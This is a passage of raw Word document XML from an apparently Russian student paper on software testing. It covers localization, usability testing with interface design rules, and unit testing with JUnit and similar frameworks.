          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Unicode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, который поддерживает практически все языки мира;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E0F40" w:rsidRPr="005E0F40"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создание возможности поддержки элементов приложения, которые невозможно локализовать стандартным образом (к примеру, вертикально расположенные иероглифы или написание арабских предложений справа налево);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E0F40"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 xml:space="preserve">создание продукта с возможностью поддержки новых </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>локалей</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> при желании пользователя, что позволяет избежать трудностей при интеграции продукта для стран с другой культурой.</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spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Юзабилити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>usability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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Pr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Юзабилити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>-тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Usability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> – удобство) – это проверка программного продукта на соответствие с требованиями в плане удобности использования приложения. Таким образом, с помощью </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>юзабилити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">-тестирования мы можем определить эргономичность (приспособленность </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>к использовании</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) программы. Тестирование удобства пользования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Выявлять проблемы, связанные со специфическим механизмом интерфейса определять, существуют ли проблемы с удобностью интерфейса для навигации, использования основного функционала.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRDefault="0014003D"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14003D" w:rsidRPr="005E0F40" w:rsidRDefault="0014003D"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 xml:space="preserve">Проверка </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>юзабилити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> приложения заключается в:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Оценка соответствия дизайна приложения к его функциональности, заданной заказчиком.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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lastRenderedPageBreak/>
        <w:t>Анализ используемых графических элементов, цветового оформления с точки зрения восприятия.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Оценке удобства навигации и ссылочной структуре.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Анализ текстового наполнения сайта.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Оценка удобства использования функциями приложения (сервисами, если это сайт).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Анализ шрифтового оформления текста.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="0014003D">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="center"/>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noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0BC4D276" wp14:editId="18CAC286">
            <wp:extent cx="3848100" cy="3733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100" cy="3733800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D" w:rsidRDefault="0014003D" w:rsidP="0014003D">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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Рисунов</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.4 - Визуализация </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>юзабилити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> тестирования</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D" w:rsidRDefault="0014003D" w:rsidP="0014003D">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10 правил проектирования пользовательского интерфейса, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Norman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Информативность системы – пользователь всегда должен знать текущий статус приложения.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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 Приближенность приложения к реальному миру – диалог с пользователем должен вестись на понятному ему языку, остерегаясь использования непонятной терминологии.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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 Система должна иметь выходы – приложение всегда должно иметь «запасные выходы» из любой функциональности, которые пользователь по ошибке запустил.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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lastRenderedPageBreak/>
        <w:t>Однозначность. Все термины, функции и понятия должны описываться в едином толковании – у пользователя не должно возникнуть путаницы.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Предусмотрительность. Система должна всячески «оберегать» пользователя от возможных ошибок.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Наглядность. Пользователь не должен ломать голову в попытках понять, что ему нужно делать или пытаясь вспомнить, как он достиг того или иного состояния системы. Возможные манипуляции с программой должны быть постоянно наглядными.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Гибкость и эффективность. Предоставляйте опытным пользователям возможность избегать рутинных действий, и в то же самое время, необходимо скрывать расширение функционала от неопытных.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Лаконичность и точность. Диалоги должны содержать только ту информацию, которую необходимо донести до пользователя, ничего лишнего.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Лояльность к ошибкам. Информация об ошибках должна быть понятной и содержать подсказки к дальнейшим действиям.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRDefault="0014003D" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>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 </w:t>
      </w:r>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Постоянная справка. Как бы информативно не была спроектирована система – она всегда должна содержать раздел справки и документации.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRDefault="0014003D" w:rsidP="0014003D">
      <w:pPr>
        <w:pStyle w:val="a3"/>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p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D" w:rsidRDefault="0014003D" w:rsidP="0014003D">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="708"/>
          <w:tab w:val="left" w:pos="2325"/>
        </w:tabs>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>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bookmarkStart w:id="9" w:name="_Toc10727430"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">1.7 Библиотека J </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Unit</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D" w:rsidRDefault="0014003D" w:rsidP="0014003D">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Pr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Unit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (юнит тестирование или модульное тестирование) — заключается в изолированной проверке каждого отдельного элемента путем запуска тестов в искусственной среде. Для этого необходимо использовать драйверы и заглушки. Поэлементное тестирование — первейшая возможность реализовать исходный код. Оценивая каждый элемент изолированно и подтверждая корректность его работы, точно установить проблему значительно проще чем, если бы элемент был частью системы. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Unit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Элемент) — наименьший компонент, который можно скомпилировать.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRDefault="0014003D" w:rsidP="0014003D">
      <w:pPr>
        <w:pStyle w:val="a3"/>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Фреймворк </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>jUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> является весьма удачным решением задач, связанных с тестированием </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> приложений. Растущая популярность привела к созданию подобных </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>фреймворков</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> для других языков. Вот некоторые из них:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Для С++ была реализована </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>CPPUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> может использоваться совместно с </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>JSUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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Для C# разработчики создали </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>NUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Perl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> скрипты можно тестировать с помощью </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
